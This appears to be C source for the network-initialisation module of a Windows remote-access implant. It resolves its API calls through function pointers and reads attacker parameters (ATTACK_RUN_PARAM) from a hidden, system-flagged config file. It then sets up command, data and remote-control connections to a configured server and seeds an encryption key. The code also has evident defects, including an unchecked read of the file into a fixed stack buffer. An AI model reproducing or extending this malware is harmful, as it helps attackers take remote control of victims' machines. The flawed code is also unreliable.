
#include <windows.h>
#include "Config.h"
#include "PublicVar.h"
#include "network/NetWorkData.h"





int removeSpace(char * data) {
	int l = lstrlenA(data);
	char * src = data;
	char * dst = data;

	int i = 0;
	int k = 0;
	for (;i < l; )
	{
		if (src[i] == ' ' || src[i] == '\t' || src[i] == '\r' || src[i] == '\n')
		{
			i++;
		}
		else {
			dst[k] = src[i];
			i++;
			k++;
		}
	}

	dst[k] = 0;

	return k;
}


unsigned int getIpFromStr(char * strip) {
	if (strip[0] >= '0' && strip[0] <= '9')
	{
		return lpinet_addr(strip);
	}else if (isalpha(strip[0]))
	{
		hostent * pHostent = lpgethostbyname(strip);
		if (pHostent) {

			ULONG  pPIp = *(DWORD*)((CHAR*)pHostent + sizeof(hostent) - sizeof(DWORD_PTR));
			ULONG  pIp = *(ULONG*)pPIp;
			DWORD dwIP = *(DWORD*)pIp;
			return dwIP;
		}
	}

	return 0;
}



int ConfigIPFileParam(){

	char strFilePath[MAX_PATH] = {0};
	int iRet = ModifyModuleFileName(strFilePath,"config.dat");
	HANDLE hfsrc = lpCreateFileA(strFilePath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,0);
	if (hfsrc == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int srcfilesize = lpGetFileSize(hfsrc,0);

	char lpsrcdata[4096];
	if(lpsrcdata == 0){
		lpCloseHandle(hfsrc);
		return FALSE;
	}

	DWORD dwcnt = 0;
	int ret = lpReadFile(hfsrc,lpsrcdata,srcfilesize,&dwcnt,0);
	lpCloseHandle(hfsrc);
	if(dwcnt != srcfilesize){
		return FALSE;
	}

	*(lpsrcdata + srcfilesize) = 0;
	ATTACK_RUN_PARAM *params = (ATTACK_RUN_PARAM*)lpsrcdata;

	if (params->username[0])
	{
		memset(gUserName, 0, sizeof(gUserName));
		memcpy(gUserName, params->username, sizeof(params->username));
	}
	
	if (params->ip[0])
	{
		char szip[32] = { 0 };
		memcpy(szip, params->ip, sizeof(params->ip));
		return getIpFromStr(szip);
	}

	return 0;
}




int IndependentNetWorkInit()
{

#ifdef SERVER_IP_ADDRESS_DOMAINNAME
#elif defined SERVER_IP_ADDRESS
#else
#endif

	DWORD dwIP = ConfigIPFileParam();
	if (dwIP == FALSE)
	{
		return FALSE;
	}

	lpRtlZeroMemory((char*)&stServDataAddr,sizeof(sockaddr_in));
	stServDataAddr.sin_addr.S_un.S_addr = dwIP;
	stServDataAddr.sin_port = lpntohs(NETWORK_DATAPORT);
	stServDataAddr.sin_family = AF_INET;

	lpRtlZeroMemory((char*)&stServCmdAddr,sizeof(sockaddr_in));
	stServCmdAddr.sin_addr.S_un.S_addr = dwIP;
	stServCmdAddr.sin_port = lpntohs(NETWORK_CMDPORT);
	stServCmdAddr.sin_family = AF_INET;

	lpRtlZeroMemory((char*)&stServRemoteCtrlAddr,sizeof(sockaddr_in));
	stServRemoteCtrlAddr.sin_addr.S_un.S_addr = dwIP;
	stServRemoteCtrlAddr.sin_port = lpntohs(NETWORK_REMOTECTRLPORT);
	stServRemoteCtrlAddr.sin_family = AF_INET;

	DWORD * pTickcount = (DWORD*)cCryptKey;
	for (int i =0; i < sizeof(cCryptKey)/sizeof(DWORD); i ++,pTickcount ++)
	{
		*pTickcount = lpGetTickCount();
	}
	return TRUE;
}